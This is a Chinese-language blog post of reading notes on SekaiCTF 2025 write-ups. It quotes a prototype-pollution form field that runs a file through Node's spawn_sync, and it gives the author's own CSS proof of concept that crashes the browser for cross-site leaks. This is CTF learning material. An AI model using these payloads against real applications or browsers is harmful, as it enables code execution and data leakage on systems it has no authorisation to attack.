---
title: SEKAICTF 2025 官方 wp 的阅读笔记
date: 2025-08-25T00:47:11+08:00
tags:
  - CTF
---

Official Writeup: https://github.com/project-sekai-ctf/sekaictf-2025/

这里是阅读笔记以及一些个人的理解和总结。

（不知道会不会有人误解，总之这篇文章仅代表我个人的观点和看法，与SekaiCTF官方无关）

<!-- more -->

# Vite



```
"__proto__.source": """
Object.prototype.flag = btoa(process.binding('spawn_sync').spawn({ file: '/flag', args: [ '/flag' ], stdio: [ {type:'pipe',readable:!0,writable:!1}, {type:'pipe',readable:!1,writable:!0}, {type:'pipe',readable:!1,writable:!0} ]}).output.toString())
""",
```

这nm是prototype pollution啊woc

```
import { form_data } from 'sk-form-data'

export const handle = form_data
```
然后
`sk-form-data`使用 https://github.com/milamer/parse-nested-form-data 这个来解析form-data

真去看了发现 这个库真有prototype pollution的风险啊

这个真是逆天吧 parse-nested-form-data 这库快3年了，周均下载量2k了没有一个人意识到prototype pollution的风险然后发个issue啥的吗？？？

太爆了这个

至于source和flag这个，只能说有prototype pollution之后发生什么我都不会感到奇怪

---

总结就是如果代码中有用的东西太少，恐怕真得去考虑供应链了

# rednote

看了PoC，用的是`@starting-style`的一个漏洞，可以导致页面崩溃，严格上也能算XSLeak了

试着造了一个PoC，

```html
<html>
    <body>
        <style></style>
        <div class="main">
                  hihi
      <style>
        @starting-style {
          *::first-letter {
            Anything: Anyvalue
          }
        }
      </style>
        </div>
    </body>
</html>
```

![](repro.png)

在我的Edge上堂堂复现。

这个也很逆天啊，而且就是说只要我找一个能导致浏览器crash的CSS片段，然后只要CSP没有限死style像下面这样

```plain
default-src 'none';
script-src 'nonce-${nonce}' 'unsafe-inline';
style-src 'unsafe-inline';
```

然后就能直接XSLeak了，这简直无敌好吧，比那些个用font-src来leak的逆天多了

-------

然后具体到这个导致浏览器crash的洞，这个则是我在网上搜不到任何有关的信息

找到一个这个，感觉可能有点像：[Null-dereference READ in blink::Element::StyleForLayoutObject](https://issues.chromium.org/issues/435225409)，但是我看不到reproduce.html，所以也不能确定

然后还有一个这个：[Animating clip-path with allow-discrete results in a crash](https://issues.chromium.org/issues/414984557)，感觉`@starting-style`也是一个crash重灾区，可以着重关注一下

无论如何，主要是真的是感觉一般人想不到这个啊（（（ 

不过这一题还是有四解，应该是有其它crash或者其它XSLeak方案。

# Notebook viewer

唯一做出来的题。个人Writeup见 [这里](/arch/SEKAICTF-2025-writeup-Notebook-viewer)

没什么好说的其实，不过官方wp用的是`performance.memory.usedJSHeapSize`。